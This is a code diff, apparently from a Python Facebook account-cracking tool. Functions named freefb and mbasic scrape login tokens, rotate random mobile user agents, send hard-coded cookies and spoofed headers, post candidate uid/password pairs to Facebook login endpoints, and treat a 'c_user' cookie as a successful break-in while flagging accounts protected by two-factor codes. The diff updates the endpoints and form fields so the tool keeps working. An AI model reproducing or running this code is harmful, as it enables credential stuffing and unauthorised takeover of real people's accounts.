@@ -1538,16 +1538,10 @@ def freefb(uid, name, pwx, tl):
             ua = random.choice(SUMONua)
             free_fb = Session.get("https://m.facebook.com").text
             data = {
-                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-                "try_number": "0",
-                "unrecognized_tries": "0",
-                "email": uid,
-                "pass": ps,
-                "login": "Log In",
-            }
+            'email': uid,
+            'pass': password,
+            'fb_dtsg': re.search('name="csrf_token" value="(.*?)"', str(free_fb)).group(1),
+            'login': 'Log In'}
             headers = {
             'Host': 'mbasic.facebook.com',
             'method': 'POST',
@@ -1785,18 +1779,20 @@ def mbasic(uid,pwx,tl):
             user_agent = f"Mozilla/5.0 (Linux; Android {random.choice(['10', '11', '12', '13'])}; {random.choice(['K', 'A', 'B', 'C', 'D', 'E'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100, 124)}.0.0.0 Mobile Safari/537.36"
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
-            data = {
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number": "0",
-            "unrecognized_tries": "0",
-            "email": uid,
-            "pass": pw,
-            "login": "Log In",}
+            data =  {
+            'email': uid,
+            'pass': pw,
+            'fb_dtsg': re.search('name="csrf_token" value="(.*?)"', str(free_fb)).group(1),
+            'login': 'Log In'}
+            cookies = {
+            'sb': 'rp_6ZrdRV1vg1JSQt-kGL7oZ',
+            'datr': 'rp_6ZvkONbQIhMeMcdrNQlTW',
+            'ps_l': '1',
+            'ps_n': '1',
+            'wd': '1051x773',
+            'fr': '1TtcqI6vgDuofxZxz.AWVpvWQ5943xchC_1nAkjvtrJKk.BmvaYd..AAA.0.0.Bm__6v.AWVlPti1cUQ',}
             headers ={
-            'Host': 'business.facebook.com',
+            'Host': 'www.facebook.com',
             'method': 'POST',
             'path': '/login/Device-based/login/async/',
             'scheme': 'https',
@@ -1816,8 +1812,8 @@ def mbasic(uid,pwx,tl):
             'user-agent': user_agent,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'dnt': '1',
-            'origin': 'https://business.facebook.com',
-            'referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
             'x-requested-with': 'mark.via.gp',
             'sec-fetch-site': 'none',
             'sec-fetch-mode': 'navigate',
@@ -1826,7 +1822,7 @@ def mbasic(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://www.facebook.com/login/device-based/regular/login/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
